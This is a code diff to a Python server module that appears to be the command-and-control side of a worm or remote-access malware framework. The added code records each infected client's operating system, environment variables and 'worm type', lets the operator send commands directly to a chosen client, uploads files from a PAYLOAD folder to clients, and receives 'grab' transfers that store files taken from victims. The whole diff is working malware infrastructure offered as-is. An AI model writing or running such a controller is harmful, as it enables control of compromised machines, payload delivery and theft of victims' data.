@@ -2,13 +2,15 @@ import socket
 import selectors
 import multiprocessing
 import base64
+import os
 
+from random import randint
 from multiprocessing import Process, Pipe
 from threading import Thread
 from time import sleep
 
 from ..tools import Messenger
-from ..CONFIG import DEFAULT_IP, RAW_LEN, FORMAT_CODE, LISTENING_STEP, MESSENGER_NO_PRINTS, SYS_MSG_HEADERS
+from ..CONFIG import DEFAULT_IP, RAW_LEN, FORMAT_CODE, LISTENING_STEP, MESSENGER_NO_PRINTS, SYS_MSG_HEADERS, OUTPUT_DIR, APP_DIRECTORY
 
 
 class MrHandler:
@@ -20,6 +22,7 @@ class MrHandler:
         self.Addr = f"{self.addr[0]} : {self.addr[1]}"
         self._sys_op = "Unknown"
         self._sys_env = "Unknown"
+        self._type = "Unknown"
     
     def close(self):
         try:
@@ -27,6 +30,14 @@ class MrHandler:
             self.conn.close()
         except:
             pass
+    
+    def return_info(self):
+        ci = "\n ----------- Client Info -----------------------------------\n"
+        ci += f"WORM TYPE: {self._type}\n\n"
+        ci += f"SYSTEM: {self._sys_op}\n\n"
+        ci += f"SYSTEM ENVIRONMENT VARIABLES:\n{self._sys_env}\n\n" + "-" * 80 
+        return ci 
+
 
 
 
@@ -36,6 +47,8 @@ class BasicTemplate(Process):
         Process.__init__(self, daemon=True)
         self.name = kwargs.get("NAME")
         self.owner = "DRACONUS"
+        self._output_dir = OUTPUT_DIR
+        self._app_dir = APP_DIRECTORY
         self._main_pipe = main_pipe
         self._ip = kwargs.get("IP", DEFAULT_IP)
         self._port = int(kwargs.get("PORT"))
@@ -52,6 +65,7 @@ class BasicTemplate(Process):
         self.CONNECTIONS = {}
         self._conn_ID = 0
         self._handler = MrHandler
+        self._direct_conn = None
         
         
 
@@ -74,16 +88,16 @@ class BasicTemplate(Process):
             self.Msg = Messenger(self.name, self._mess_no_prints)
             self.CTRL = ServerControler(self._main_pipe, self)
             self.CTRL.start()
-        self.Msg(f"[{self.name}] Server < {self.name} > create succesfull. Addr: {self._ip} : {self._port}", level=True)
+        self.Msg(f"\n[{self.name}] Server < {self.name} > create succesfull. Addr: {self._ip} : {self._port}", level=True)
         return True
     
     def _rebuild_socket(self):
         if self._listen_FLAG:
-            self.Msg(f"[{self.name}] ERROR: Cant rebuild socket. Is still active", level=True)
+            self.Msg(f"\n[{self.name}] ERROR: Cant rebuild socket. Is still active", level=True)
             return False
         else:
             if self._build_server(first_time=False):
-                self.Msg(f"[{self.name}] Socket rebuild successfull", level=True)
+                self.Msg(f"\n[{self.name}] Socket rebuild successfull", level=True)
                 self._is_listening = False
                 return True
     
@@ -104,13 +118,12 @@ class BasicTemplate(Process):
                 if key.fileobj is self.server:
                     self._accept_conn()
         self.Msg(f"\n[{self.name}] Stop Listening ....", level=True)
+        self._close_conn()
         self.selector.unregister(self.server)
         self.server.shutdown(socket.SHUT_RDWR)
         self.server.close()
         self._rebuild_socket()
 
-
-        
 
     def listening(self):
         if not self._build_listening():
@@ -133,9 +146,9 @@ class BasicTemplate(Process):
     def _show_connections(self):
         self.Msg(f"CONNECTIONS: {self.CONNECTIONS}")
         self.Msg(f"\n[{self.name}] ------------- Connected Clients --------------------------\n", level=True, end=False)
-        self.Msg(f"\n[{self.name}]--- ID ----- IP -------- PORT--------OP SYSTEM--------\n", level=True, end=False)
+        self.Msg(f"\n--- ID ----- IP -------- PORT---------- WORM TYPE -------- OP SYSTEM -------------\n", level=True, end=False)
         for c in self.CONNECTIONS:
-            self.Msg(f"** {c}  -  {self.CONNECTIONS[c].Addr}  - {self.CONNECTIONS[c]._sys_op}", level=True, end=False)
+            self.Msg(f"** {c}  ---  {self.CONNECTIONS[c].Addr}  --- {self.CONNECTIONS[c]._type}  ---  {self.CONNECTIONS[c]._sys_op}", level=True, end=False)
         self.Msg("")
     
     def _client_info(self, client_id):
@@ -193,6 +206,8 @@ class BasicTemplate(Process):
                 self._exec_sys_command(handler, msg)
             else:
                 self.Msg(f"\nMsg from: {handler.Addr}\n{msg}\n")
+        if handler is self._direct_conn:
+            self._reset_direct_conn()
         self.Msg.only_log(f"Close Connection: {self._close_target_conn(handler)}\n")
     
     def _send_msg(self, msg, handler):
@@ -213,8 +228,37 @@ class BasicTemplate(Process):
         cmd = self._unpack_sys_cmd(command)
         if cmd[0] == "sys_info":
             handler._sys_op = cmd[1]
-        if cmd[0] == "sys_env":
+        elif cmd[0] == "sys_env":
             handler._sys_env = cmd[1]
+        elif cmd[0] == "worm_name":
+            handler._type = cmd[1]
+        else:
+            self.exec_sys_command(handler, command)
+    
+    def exec_sys_command(self, handler, command):
+        pass
+
+
+    def _set_direct_conn(self, client_id):
+        self._direct_conn = self.CONNECTIONS.get(str(client_id))
+        if not self._direct_conn:
+            self.Msg(f"[{self.name}] Error: Client is not connect", level=True)
+            return False
+        self.Msg(f"[{self.name}] Set direct conn to: {self._direct_conn.Addr}", level=True)
+        return True
+    
+    def _reset_direct_conn(self):
+        self._direct_conn = None
+        self.Msg(f"[{self.name}] Exit from direct connection")
+
+
+    
+    def _save_client_info(self):
+        self.Msg(f"\n************************** ALL CONNECTED CLIENTS ********************************\n", end=False)
+        for hand in self.CONNECTIONS:
+            self.Msg(self.CONNECTIONS[hand].return_info(), end=False)
+            self.Msg("-" * 80, end=False)
+        self.Msg("")
     
     def _show_config(self):
         config = {
@@ -230,12 +274,22 @@ class BasicTemplate(Process):
     
     def _send_config(self):
         self.Msg(f"{self.sys_msg}JSON")
-        sleep(0.2)
+        sleep(0.5)
         self.Msg._send_json(self.show_config())
+    
+    def _get_client(self, index):
+        client = self.CONNECTIONS.get(index)
+        if not client:
+            return None
+        else:
+            return client
+    
+    def base_command(self, cmd):
+        return False
+    
+    def _extra_command(self, cmd):
+        pass
 
-
-
-        
     
     def show_config(self):
         return self._show_config()
@@ -273,7 +327,17 @@ class ServerControler(Thread):
     
 
 
+
     def _base_command(self, cmd):
+        if self.SERVER._direct_conn and cmd == "QQ":
+            self.SERVER._reset_direct_conn()
+            return True
+        elif self.SERVER._direct_conn:
+            self.SERVER._send_msg(cmd, self.SERVER._direct_conn)
+            return True
+
+        
+        
         if cmd == "start":
             self.SERVER.listening()
         elif cmd == "show":
@@ -287,8 +351,13 @@ class ServerControler(Thread):
         elif cmd.startswith("info"):
             client_id = cmd.lstrip("info").strip(" ")
             self.SERVER._client_info(client_id)
+        elif cmd == "saveinfo":
+            self.SERVER._save_client_info()
+        elif cmd.startswith("@"):
+            client_id = cmd.lstrip("@").strip(" ")
+            self.SERVER._set_direct_conn(client_id)
         else:
-            print("Unknown")
+            self.SERVER.base_command(cmd)
     
     def run(self):
         while True:
@@ -297,3 +366,150 @@ class ServerControler(Thread):
                 continue
             else:
                 self._base_command(check)
+
+
+
+class AdvTemplate(BasicTemplate):
+    def __init__(self, main_pipe, **kwargs):
+        super().__init__(main_pipe, **kwargs)
+        self.out_dir = os.path.join(self._output_dir, self.name)
+        self.payload_dir = os.path.join(self._app_dir, "PAYLOAD")
+        self.make_dirs()
+        self.extra_socket = {}
+        self._number_attemps = 100
+
+    
+    def make_dirs(self):
+        if not os.path.exists(self.out_dir):
+            os.mkdir(self.out_dir)
+        if not os.path.exists(self.payload_dir):
+            os.mkdir(self.payload_dir)
+    
+    def _make_extra_socket(self):
+        count = 0
+        try:
+            _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            _socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        except OSError as e:
+            self.Msg(f"[{self.name}] ERROR: Extra socket error: {e}")
+            return None
+        
+        while True:
+            count += 1
+            if count >= self._number_attemps:
+                return None
+            _port = randint(1200, 9999)
+            try:
+                _socket.bind((self._ip, _port))
+                break
+            except:
+                continue
+        
+        return (_socket, _port)
+
+    def _prepare_download(self, fname, flen, handler):
+        sock, port = self._make_extra_socket()
+        if not sock:
+            return False
+        pre = f"{self.sys_msg}sock_addr{self.sys_msg}{str(port)}{self.sys_msg}"
+        self._send_msg(pre, handler)
+        try:
+            sock.listen(1)
+        except OSError as e:
+            self.Msg(f"\n[{self.name}] ERROR: listening extra socket error: {e}")
+            return False
+        flen = int(float(flen))
+        conn, addr = sock.accept()
+        item = b""
+        while len(item) < flen:
+            buff = conn.recv(flen - len(item))
+            if not buff:
+                return False
+            item += buff
+        try:
+            sock.shutdown(socket.SHUT_RDWR)
+            sock.close()
+        except:
+            pass
+        self._save_item(fname, item)
+
+        
+    
+    def _save_item(self, fname, data):
+        with open(os.path.join(self.out_dir, fname), "wb") as f:
+            f.write(data)
+        self.Msg(f"\n[{self.name}] Save Item: < {fname} > successfull")
+
+        
+    def _download_item(self, fname, flen, handler):
+        download = Thread(target=self._prepare_download, args=(fname, flen, handler), daemon=True)
+        download.start()
+    
+    def _upload_item(self, name, handler):
+        fpath = os.path.join(self.payload_dir, name)
+        if not os.path.exists(fpath):
+            self.Msg(f"\n[{self.name}] ERROR: File doesnt exist")
+            return False
+        flen = str(os.stat(fpath).st_size)
+        xsocket, port = self._make_extra_socket()
+        if not xsocket:
+            return False
+        msg = f"upload {name} {flen} {str(port)}"
+        self._send_msg(msg, handler)
+        # delivery = Thread(target=self._send_item, args=(fpath, handler, xsocket))
+        # delivery.start()
+        self._send_item(fpath, handler, xsocket, name)
+        self.Msg(f"\n[{self.name}] Send file start: {name} ")
+
+    def _send_item(self, fpath, handler, xsocket, name):
+        try:
+            xsocket.listen(1)
+        except OSError as e:
+            self.Msg(f"\n[{self.name}] ERROR: Extra socket listen error: {e}")
+            return False
+        
+        conn, addr = xsocket.accept()
+        try:
+            with open(fpath, "rb") as f:
+                conn.sendfile(f, 0)
+        except OSError as e:
+            self.Msg(f"\n[{self.name}] ERROR: Extra socket send error: {e}")
+            return False
+        
+        try:
+            xsocket.shutdown(socket.SHUT_RDWR)
+            xsocket.close()
+        except:
+            pass
+        self.Msg(f"\n[{self.name}] File < {name} > send successfull")
+        return True
+    
+    def upload_item(self, name, handler):
+        up = Thread(target=self._upload_item, args=(name, handler), daemon=True)
+        up.start()
+        self.Msg(f"\n[{self.name}] Start send item: < {name} > to < {handler.Addr} >\n")
+
+    
+    def base_command(self, cmd):
+        self.Msg(f"BASE COMMAND: {cmd}")
+        if cmd.startswith("up"):
+            com = cmd.split(" ")
+            client = self._get_client(com[1])
+            if not client:
+                self.Msg(f"[{self.name}] ERROR: Client ID doesnt exist", level=True)
+                return True
+            self.upload_item(com[2], client)
+            return True
+        return None
+
+    
+    def exec_sys_command(self, handler, command):
+        cmd = self._unpack_sys_cmd(command)
+        if cmd[0] == "grab" and len(cmd) > 2:
+            self._download_item(cmd[1], cmd[2], handler)
+        else:
+            self.Msg(f"[{self.name}] Client: {handler.Addr} send unknown sys command: {str(cmd)}")
+    
+   
+
+
